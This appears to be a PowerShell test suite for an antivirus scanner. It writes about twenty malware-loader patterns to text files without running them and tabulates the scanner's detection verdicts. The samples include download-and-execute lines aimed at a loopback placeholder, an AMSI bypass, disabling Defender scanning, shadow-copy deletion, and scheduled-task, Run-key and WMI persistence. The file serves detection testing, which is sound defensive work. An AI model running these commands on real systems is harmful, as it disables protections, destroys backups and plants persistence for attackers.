# A suite of known evasion shapes, generated as text and scanned, never run.
#
# Each entry is one way loaders hide a payload: an encoding, an archive, a
# language, an execution primitive. The scanner reads them; nothing executes.
# The table at the end is the coverage answer: which shapes are caught today and
# which are not.

param(
    [string]$Output = (Join-Path $env:TEMP 'evasion-suite'),
    [string]$Scanner = 'C:\Users\wensz\Downloads\wenle-av\target\release\wenle.exe'
)

$ErrorActionPreference = 'Stop'
if (Test-Path $Output) { Remove-Item $Output -Recurse -Force }
New-Item -ItemType Directory -Path $Output -Force | Out-Null

$blob = -join (1..2600 | ForEach-Object { [char](65 + (Get-Random -Maximum 26)) })
$hex = -join (1..2600 | ForEach-Object { '{0:x2}' -f (Get-Random -Maximum 256) })
$chars = (1..300 | ForEach-Object { (Get-Random -Minimum 97 -Maximum 122) }) -join ','

$cases = @(
    @{ Name = 'ps1-base64-iex'; Body = @"
`$b = '$blob'
`$s = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(`$b))
iex `$s
"@ },
    @{ Name = 'ps1-base64-file-start'; Body = @"
`$b = [Convert]::FromBase64String('$blob')
[IO.File]::WriteAllBytes("`$env:TEMP\p.bin", `$b)
Start-Process "`$env:TEMP\p.bin"
"@ },
    @{ Name = 'ps1-xor-iex'; Body = @"
`$d = '$hex'
`$b = New-Object byte[] (`$d.Length/2)
for (`$i=0; `$i -lt `$b.Length; `$i++) { `$b[`$i] = [Convert]::ToByte(`$d.Substring(`$i*2,2),16) -bxor 0x5A }
`$s = [Text.Encoding]::UTF8.GetString(`$b)
iex `$s
"@ },
    @{ Name = 'ps1-charcode-join'; Body = @"
`$c = @($chars)
`$s = -join (`$c | ForEach-Object { [char]`$_ })
iex `$s
"@ },
    @{ Name = 'ps1-downloadstring-iex'; Body = 'IEX (New-Object Net.WebClient).DownloadString("http://127.0.0.1:9/x.ps1")' },
    @{ Name = 'ps1-iwr-file-start'; Body = @'
Invoke-WebRequest "http://127.0.0.1:9/x.zip" -OutFile "$env:TEMP\x.zip"
Expand-Archive "$env:TEMP\x.zip" "$env:TEMP\x" -Force
Start-Process "$env:TEMP\x\setup.exe"
'@ },
    @{ Name = 'ps1-amsi-patch'; Body = @'
$a = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
$f = $a.GetField("amsiInitFailed", "NonPublic,Static")
$f.SetValue($null, $true)
'@ },
    @{ Name = 'ps1-defender-disable'; Body = 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true' },
    @{ Name = 'ps1-shadow-delete'; Body = 'vssadmin delete shadows /all /quiet; wbadmin delete catalog -quiet' },
    @{ Name = 'ps1-schtasks-persist'; Body = 'schtasks /create /tn Updater /tr "powershell -w hidden -c iex(iwr http://127.0.0.1:9/a)" /sc minute /mo 5 /f' },
    @{ Name = 'ps1-runkey-persist'; Body = 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d "cmd /c start %APPDATA%\setup.exe" /f' },
    @{ Name = 'ps1-wmi-subscription'; Body = @'
$f = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{Name='x';EventNameSpace='root\cimv2';QueryLanguage='WQL';Query='select * from __instancemodificationevent within 60 where targetinstance isa "win32_process"'}
'@ },
    @{ Name = 'ps1-registry-payload'; Body = @'
$b = '$blob'
Set-ItemProperty HKCU:\Software\Updater -Name Data -Value $b
$x = (Get-ItemProperty HKCU:\Software\Updater).Data
iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x)))
'@ },
    @{ Name = 'vbs-adodb-run'; Body = @"
Set x = CreateObject("MSXml2.DOMDocument").createElement("b")
x.dataType = "bin.base64" : x.text = "$blob"
Set o = CreateObject("ADODB.Stream") : o.Type = 1 : o.Open
o.Write x.nodeTypedValue : o.SaveToFile "p.cab", 2 : o.Close
CreateObject("WScript.Shell").Run "%APPDATA%\setup.exe"
"@ },
    @{ Name = 'js-msxml-shell'; Body = @"
var x = new ActiveXObject("MSXml2.DOMDocument").createElement("b");
x.dataType = "bin.base64"; x.text = "$blob";
var o = new ActiveXObject("ADODB.Stream"); o.type = 1; o.open();
o.write(x.nodeTypedValue); o.saveToFile("p.cab", 2); o.close();
new ActiveXObject("WScript.Shell").Run("%APPDATA%\\setup.exe");
"@ },
    @{ Name = 'hta-vbscript-run'; Body = @"
<script language="VBScript">
CreateObject("WScript.Shell").Run "powershell -w hidden -c iex(iwr http://127.0.0.1:9/a)"
</script>
"@ },
    @{ Name = 'bat-certutil-start'; Body = @"
certutil -decode "$hex" payload.bin
start "" "%APPDATA%\setup.exe"
"@ },
    @{ Name = 'bat-tar-start'; Body = @"
tar -xf "%~dp0payload.tar" -C %TEMP%\t
start "" "%TEMP%\t\setup.exe"
"@ },
    @{ Name = 'bat-bitsadmin-start'; Body = @"
bitsadmin /transfer j http://127.0.0.1:9/x.exe %TEMP%\x.exe
start "" "%TEMP%\x.exe"
"@ },
    @{ Name = 'py-exec-base64'; Body = @"
import base64, subprocess
open('p.bin','wb').write(base64.b64decode('$blob'))
subprocess.Popen(['p.bin'])
"@ }
)

$results = @()
foreach ($case in $cases) {
    $file = Join-Path $Output ($case.Name + '.txt')
    Set-Content -Path $file -Value $case.Body -Encoding ASCII
    $out = & $Scanner scan $file 2>&1
    $verdict = ($out | Select-String -Pattern 'malicious|suspicious|Nothing found' | Select-Object -Last 1).Line
    if (-not $verdict) { $verdict = 'no verdict' }
    $score = ($out | Select-String -Pattern 'score [0-9]+' | Select-Object -Last 1).Line
    $results += [pscustomobject]@{
        Case = $case.Name
        Verdict = ($verdict -replace ' files were reported.*','' -replace 'suspicious .*','suspicious' -replace 'malicious .*','malicious' -replace 'Nothing found.*','nothing').Trim()
        Score = ($score -replace '.*score ','').Trim()
    }
}

$results | Format-Table -AutoSize
$caught = ($results | Where-Object { $_.Verdict -eq 'malicious' }).Count
$suspicious = ($results | Where-Object { $_.Verdict -eq 'suspicious' }).Count
$nothing = ($results | Where-Object { $_.Verdict -eq 'nothing' }).Count
"caught: $caught  suspicious: $suspicious  nothing: $nothing  of $($results.Count)"
